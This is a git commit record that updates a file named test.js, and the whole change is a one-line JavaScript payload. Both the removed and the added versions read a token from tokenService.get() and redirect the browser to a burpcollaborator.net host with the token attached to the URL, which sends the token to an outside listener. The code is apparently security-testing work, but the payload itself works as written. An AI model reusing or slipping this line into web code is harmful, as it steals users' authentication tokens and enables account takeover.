d4b89d0b3f97b849c83a261221f2157d1b423878
Smith <46734345+hoangthanhnguyen@users.noreply.github.com>
2020-08-19 14:53:22 +0700

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,2 @@
-document.location='http://4qviaaiy1b6kafdk0wefcptzrqxgl5.burpcollaborator.net/?token='+tokenService.get();
+var a = tokenService.get();
+document.location='http://4qviaaiy1b6kafdk0wefcptzrqxgl5.burpcollaborator.net/?token='+a;
